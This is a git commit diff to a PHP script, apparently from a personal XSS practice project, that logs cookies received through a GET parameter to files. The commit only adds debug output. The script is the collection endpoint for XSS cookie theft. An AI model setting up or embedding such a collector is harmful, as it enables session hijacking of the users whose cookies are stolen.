4f73ec2baa4a815adfe3c0533708df7f80dadd85
local_snishiwaki <local_snishiwaki@PC1309D.local>
2019-08-15 16:01:57 +0900

    Fix

--- xss/cookie_log.php
+++ xss/cookie_log.php
@@ -1,4 +1,6 @@
 <?php
 $s = serialize(@$_GET['cookie']);
-echo $s;
-file_put_contents('./cookie_log/' . md5($s), $s);
+echo $s . "\n";
+echo md5($s) . "\n";
+$ret = file_put_contents('./cookie_log/' . md5($s), $s);
+echo $ret;
